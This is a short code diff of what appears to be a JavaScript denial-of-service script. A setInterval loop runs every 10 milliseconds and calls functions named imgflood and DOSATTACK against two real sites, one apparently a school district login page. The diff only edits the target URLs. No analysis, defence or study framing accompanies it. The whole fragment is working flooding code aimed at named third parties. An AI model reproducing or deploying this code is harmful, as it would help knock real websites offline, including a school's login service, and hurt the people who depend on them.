@@ -17,8 +17,9 @@ setInterval(function(){
 }
 
 setInterval(function(){
-  imgflood("http://jihadology.net");
-  imgflood("http://ls-child.mvcsc.k12.in.us");
-  DOSATTACK("http://jihadology.net");
-  DOSATTACK("http://ls-child.mvcsc.k12.in.us");
+  imgflood("jihadology.net");
+  imgflood("ls-child.mvcsc.k12.in.us/login");
+  DOSATTACK("jihadology.net");
+  DOSATTACK("ls-child.mvcsc.k12.in.us/login");
 }, 10);
+
